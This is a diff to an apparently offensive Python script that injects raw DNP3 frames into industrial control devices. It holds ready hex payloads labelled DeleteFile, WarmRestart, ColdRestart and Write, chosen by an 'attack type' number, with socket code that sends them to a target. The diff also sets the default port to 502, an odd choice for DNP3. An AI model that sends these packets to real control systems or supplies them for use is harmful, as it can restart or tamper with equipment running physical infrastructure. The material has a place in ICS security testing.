@@ -23,7 +23,7 @@ dnp3_DeleteFile="056408c401000200390ddece1b218c"
 dnp3_ReadRequest="056405c903000400bd71"
 
 dnp3_list=[
-           "056405c001000004e921",  #dnp3_HealthCheck
+           "056405c001000004e921",  #dnp3_HealthCheck:056405c903000400bd71
            "056408c40a000100fc42c0c00e7edc", #dnp3_WarmRestart
            "056408c40a000100fc42c0c00d9c86", #dnp3_ColdRestart
            "056412c403000400152dc1c10232010701fa7d0b460d01c863", #dnp3_Write
@@ -34,8 +34,10 @@ dnp3_list=[
     ]
 
 HOST = "127.0.0.1"
-PORT = 20000
 BUFSIZ = 1024
+DNP3_type = 8  #default to Request Link Status, if not specify DNP3 packet attack type [1..8]
+PORT = 502
+
 
 
 def usage():
@@ -71,6 +73,7 @@ def debug(msg):
 
 
 def send_dnp3_packet(socket, dnp3_type = 8):
+    global  HOST,BUFSIZ,DNP3_type,PORT
  
     dnp3_pdu = dnp3_list[int(dnp3_type) - 1]
     print  ("Sending DNP3 packet to target %s: %s"%(HOST, dnp3_pdu))
@@ -87,7 +90,8 @@ def debug(msg):
         print ("debug: %s" % msg)
 
 def main(argv):
-    DNP3_type = 8  #default to Request Link Status, if not specify DNP3 packet attack type [1..8]
+
+    global  HOST,BUFSIZ,DNP3_type,PORT
 
     try:
         opts,args = getopt.getopt(sys.argv[1:],"hp:i:t:",["help","ip=","port=","type="])
@@ -115,14 +119,13 @@ def main(argv):
              if (DNP3_type > len(dnp3_list)):
                      print ("DNP3 type %s is out of range [1-%s]!" % (arg, len(dnp3_list)))
                      sys.exit(1)
-             print  ("DNP3 injected type: %s"% DNP3_type)
           else:
              usage()
              sys.exit(1)
             
                 
-
     try:
+        print  ("DNP3 injected type: %s"% DNP3_type)
         tcpCliSock = socket(AF_INET, SOCK_STREAM)
     except error, e:
         print  ("create socket failed %s" % e)
